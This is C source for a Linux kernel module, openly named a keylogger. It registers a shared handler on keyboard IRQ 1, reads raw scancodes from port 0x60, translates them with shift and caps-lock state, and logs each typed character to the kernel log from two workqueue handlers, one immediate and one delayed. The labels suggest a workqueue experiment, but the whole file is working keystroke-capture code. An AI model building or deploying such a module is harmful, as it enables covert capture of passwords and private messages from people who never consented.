#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/slab.h>
#include <linux/io.h>
#include <linux/workqueue.h>
#include <linux/delay.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("tshyana");

#define IRQ_NUM 1

static const char *keymap_lower[84] = {
    "", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "Backspace",
    "Tab", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "Enter", "Ctrl",
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "Shift", "\\",
    "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "Shift",
    "*", "Alt", " ", "CapsLock",
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10",
    "NumLock", "ScrollLock", "Home", "Up", "PageUp", "-", "Left",
    "", "Right", "+", "End", "Down", "PageDown", "Insert", "Delete"
};

static const char *keymap_upper[84] = {
    "", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "Backspace",
    "Tab", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "Enter", "Ctrl",
    "A", "S", "D", "F", "G", "H", "J", "K", "L", ":", "\"", "~", "Shift", "|",
    "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?", "Shift",
    "*", "Alt", " ", "CapsLock",
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10",
    "NumLock", "ScrollLock", "Home", "Up", "PageUp", "-", "Left",
    "", "Right", "+", "End", "Down", "PageDown", "Insert", "Delete"
};

static bool shift_pressed = false;
static bool caps_lock_on = false;

typedef struct {
    struct work_struct work;
    int scancode;
} key_work_t;

static struct workqueue_struct *key_wq;
static key_work_t *work_immediate, *work_delayed;

static const char *resolve_key(int code) {
    const char *key = NULL;
    if (code >= 0 && code < 84) {
        if (keymap_lower[code][0] >= 'a' && keymap_lower[code][0] <= 'z') {
            bool upper = (shift_pressed ^ caps_lock_on);
            key = upper ? keymap_upper[code] : keymap_lower[code];
        } else {
            key = shift_pressed ? keymap_upper[code] : keymap_lower[code];
        }
    }
    return key;
}

static void process_key(int code, const char *label) {
    bool released = code & 0x80;
    int scancode = code & 0x7F;

    if (!released) {
        if (scancode == 42 || scancode == 54) {
            shift_pressed = true;
            return;
        }
        if (scancode == 58) {
            caps_lock_on = !caps_lock_on;
            return;
        }
    } else {
        if (scancode == 42 || scancode == 54) {
            shift_pressed = false;
            return;
        }
    }

    if (!released) {
        const char *key = resolve_key(scancode);
        if (key && strlen(key) == 1)
            printk(KERN_INFO "[keylogger_workq_case] [%s] Key: %s (code: %d)\n", label, key, scancode);
    }
}

static void work_nosleep_fn(struct work_struct *work) {
    key_work_t *kw = container_of(work, key_work_t, work);
    process_key(kw->scancode, "nosleep");
}

static void work_sleep_fn(struct work_struct *work) {
    key_work_t *kw = container_of(work, key_work_t, work);
    msleep(10);
    process_key(kw->scancode, "sleep");
}

static irqreturn_t my_irq_handler(int irq, void *dev_id) {
    if (irq == IRQ_NUM) {
        int code = inb(0x60);
        work_immediate->scancode = code;
        work_delayed->scancode = code;

        queue_work(key_wq, &work_immediate->work);
        queue_work(key_wq, &work_delayed->work);
        return IRQ_HANDLED;
    }
    return IRQ_NONE;
}

static int __init keylogger_init(void) {
    int ret = request_irq(IRQ_NUM, my_irq_handler, IRQF_SHARED, "keylogger_workq_case", (void *)(my_irq_handler));
    if (ret) {
        printk(KERN_ERR "[keylogger_workq_case] Failed to request IRQ: %d\n", ret);
        return ret;
    }

    key_wq = alloc_workqueue("key_wq", WQ_MEM_RECLAIM, 1);
    if (!key_wq) {
        free_irq(IRQ_NUM, (void *)(my_irq_handler));
        return -ENOMEM;
    }

    work_immediate = kmalloc(sizeof(key_work_t), GFP_KERNEL);
    work_delayed = kmalloc(sizeof(key_work_t), GFP_KERNEL);

    if (!work_immediate || !work_delayed) {
        kfree(work_immediate);
        kfree(work_delayed);
        destroy_workqueue(key_wq);
        free_irq(IRQ_NUM, (void *)(my_irq_handler));
        return -ENOMEM;
    }

    INIT_WORK(&work_immediate->work, work_nosleep_fn);
    INIT_WORK(&work_delayed->work, work_sleep_fn);

    printk(KERN_INFO "[keylogger_workq_case] Module loaded\n");
    return 0;
}

static void __exit keylogger_exit(void) {
    cancel_work_sync(&work_immediate->work);
    cancel_work_sync(&work_delayed->work);
    kfree(work_immediate);
    kfree(work_delayed);

    if (key_wq)
        destroy_workqueue(key_wq);

    synchronize_irq(IRQ_NUM);
    free_irq(IRQ_NUM, (void *)(my_irq_handler));

    printk(KERN_INFO "[keylogger_workq_case] Module unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);